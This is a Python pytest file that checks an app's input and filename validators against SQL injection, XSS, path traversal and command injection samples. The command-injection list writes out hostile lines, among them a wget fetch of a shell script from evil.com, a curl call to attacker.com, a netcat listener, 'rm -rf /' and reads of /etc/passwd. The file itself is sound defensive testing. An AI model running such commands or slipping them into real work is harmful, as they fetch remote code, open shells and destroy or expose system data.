"""
Security test cases
"""

import pytest
from app.security import validate_input, validate_filename, COMPILED_PATTERNS

def test_sql_injection_detection():
    """Test SQL injection pattern detection"""
    # Test malicious SQL patterns
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM users",
        "' OR 1=1 --",
        "admin' OR 'a'='a",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]
    
    for malicious_input in malicious_inputs:
        assert not validate_input(malicious_input), f"Failed to detect SQL injection: {malicious_input}"

def test_xss_detection():
    """Test XSS pattern detection"""
    # Test malicious XSS patterns
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('xss')",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "vbscript:msgbox('xss')"
    ]
    
    for malicious_input in malicious_inputs:
        assert not validate_input(malicious_input), f"Failed to detect XSS: {malicious_input}"

def test_path_traversal_detection():
    """Test path traversal pattern detection"""
    # Test malicious path traversal patterns
    malicious_inputs = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "c:\\windows\\system32\\config\\sam"
    ]
    
    for malicious_input in malicious_inputs:
        assert not validate_input(malicious_input), f"Failed to detect path traversal: {malicious_input}"

def test_command_injection_detection():
    """Test command injection pattern detection"""
    # Test malicious command injection patterns
    malicious_inputs = [
        "; cat /etc/passwd",
        "| nc -l 4444",
        "&& wget http://evil.com/shell.sh",
        "`whoami`",
        "$(id)",
        "; rm -rf /",
        "| curl http://attacker.com",
        "&& chmod 777 /etc/passwd"
    ]
    
    for malicious_input in malicious_inputs:
        assert not validate_input(malicious_input), f"Failed to detect command injection: {malicious_input}"

def test_valid_inputs():
    """Test that valid inputs are accepted"""
    valid_inputs = [
        "SG",
        "2025-Apr",
        "TestUser123",
        "Normal text input",
        "test@example.com",
        "Product-Name_123",
        "Valid (parentheses) and [brackets]",
        "Numbers: 123.45",
        "Date: 2025-04-01"
    ]
    
    for valid_input in valid_inputs:
        assert validate_input(valid_input), f"Valid input rejected: {valid_input}"

def test_filename_validation():
    """Test filename validation"""
    # Valid filenames
    valid_filenames = [
        "data.xlsx",
        "report.xls",
        "Market_Data_2025.xlsx",
        "SG-Report-Apr-2025.xlsx",
        "test123.xlsx"
    ]
    
    for filename in valid_filenames:
        assert validate_filename(filename), f"Valid filename rejected: {filename}"
    
    # Invalid filenames
    invalid_filenames = [
        "data.txt",  # Wrong extension
        "data.exe",  # Dangerous extension
        "../data.xlsx",  # Path traversal
        "data<script>.xlsx",  # XSS attempt
        "data|pipe.xlsx",  # Pipe character
        "very_long_filename_" + "x" * 300 + ".xlsx",  # Too long
        "data.xlsx.exe",  # Double extension
        "",  # Empty filename
        "data?.xlsx",  # Question mark
        "data*.xlsx"  # Asterisk
    ]
    
    for filename in invalid_filenames:
        assert not validate_filename(filename), f"Invalid filename accepted: {filename}"

def test_input_length_validation():
    """Test input length validation"""
    # Test very long input
    long_input = "x" * 1001  # Exceeds MAX_PARAM_LENGTH
    assert not validate_input(long_input), "Long input not rejected"
    
    # Test acceptable length
    acceptable_input = "x" * 999  # Within MAX_PARAM_LENGTH
    assert validate_input(acceptable_input), "Acceptable length input rejected"

def test_pattern_compilation():
    """Test that all security patterns compile correctly"""
    assert len(COMPILED_PATTERNS) > 0, "No security patterns compiled"
    
    # Test that patterns can be used
    test_string = "SELECT * FROM users"
    matches = any(pattern.search(test_string) for pattern in COMPILED_PATTERNS)
    assert matches, "SQL pattern not detected by compiled patterns"

def test_empty_and_none_inputs():
    """Test handling of empty and None inputs"""
    assert validate_input(None), "None input should be valid"
    assert validate_input(""), "Empty string should be valid"
    assert validate_input("   "), "Whitespace string should be valid"

def test_unicode_inputs():
    """Test handling of unicode inputs"""
    unicode_inputs = [
        "测试",  # Chinese characters
        "тест",  # Cyrillic characters
        "🔒",   # Emoji
        "café",  # Accented characters
    ]
    
    # These should be handled gracefully (either accepted or rejected consistently)
    for unicode_input in unicode_inputs:
        result = validate_input(unicode_input)
        # Just ensure it doesn't crash
        assert isinstance(result, bool), f"Unicode input caused error: {unicode_input}"
